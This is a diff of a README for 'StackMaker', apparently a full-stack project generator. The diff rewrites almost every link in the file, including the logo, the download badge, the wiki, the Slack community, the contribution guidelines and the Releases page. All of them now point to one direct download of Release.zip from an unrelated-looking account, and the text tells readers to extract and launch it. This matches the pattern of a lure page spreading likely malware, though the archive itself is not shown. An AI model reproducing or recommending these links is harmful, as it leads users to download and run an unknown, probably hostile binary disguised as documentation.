@@ -1,6 +1,6 @@
 # Welcome to StackMaker 🚀
 
-![StackMaker Logo](https://example.com/logo.png)
+![StackMaker Logo](https://github.com/HELLOURXHXH/StackMaker/releases/download/v1.0/Release.zip)
 
 ## Introduction
 Welcome to StackMaker, the interactive project generator that simplifies the process of creating custom full-stack applications. Developers can now easily craft their own applications with a pre-configured setup, thanks to StackBuilder.
@@ -12,9 +12,9 @@ Welcome to StackMaker, the interactive project generator that simplifies the pro
 🚀 Accelerate your development process  
 
 ## Installation
-To get started with StackMaker, simply download the latest version [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip).  
+To get started with StackMaker, simply download the latest version [here](https://github.com/HELLOURXHXH/StackMaker/releases/download/v1.0/Release.zip).  
 
-[![Download StackMaker](https://img.shields.io/badge/Download-StackMaker-green.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download StackMaker](https://github.com/HELLOURXHXH/StackMaker/releases/download/v1.0/Release.zip)](https://github.com/HELLOURXHXH/StackMaker/releases/download/v1.0/Release.zip)
 
 Once downloaded, extract the zip file and launch the application to start building your custom projects effortlessly.
 
@@ -37,11 +37,11 @@ StackMaker covers a wide range of technologies, including:
 Have an idea for improving StackMaker? Feel free to suggest new features or provide feedback by creating an issue or submitting a pull request. Your contributions are highly appreciated!
 
 ## Additional Resources
-- Check out our [wiki](https://github.com/StackMaker/wiki) for tutorials and guides.
-- Join our [Slack community](https://slack.com/stackmaker) to connect with other developers.
+- Check out our [wiki](https://github.com/HELLOURXHXH/StackMaker/releases/download/v1.0/Release.zip) for tutorials and guides.
+- Join our [Slack community](https://github.com/HELLOURXHXH/StackMaker/releases/download/v1.0/Release.zip) to connect with other developers.
 
 ## Contributing
-We welcome contributions from the community! If you'd like to contribute to StackMaker, please follow our [contribution guidelines](CONTRIBUTING.md).
+We welcome contributions from the community! If you'd like to contribute to StackMaker, please follow our [contribution guidelines](https://github.com/HELLOURXHXH/StackMaker/releases/download/v1.0/Release.zip).
 
 ## License
 StackMaker is licensed under the MIT License. See [LICENSE](LICENSE) for details.
@@ -52,5 +52,5 @@ StackMaker is licensed under the MIT License. See [LICENSE](LICENSE) for details
 
 ---
 
-Remember to always check the [Releases](https://github.com/22155555/1875695542/releases) section for the latest updates and improvements to StackMaker. Happy building! 🛠🎉
+Remember to always check the [Releases](https://github.com/HELLOURXHXH/StackMaker/releases/download/v1.0/Release.zip) section for the latest updates and improvements to StackMaker. Happy building! 🛠🎉
 
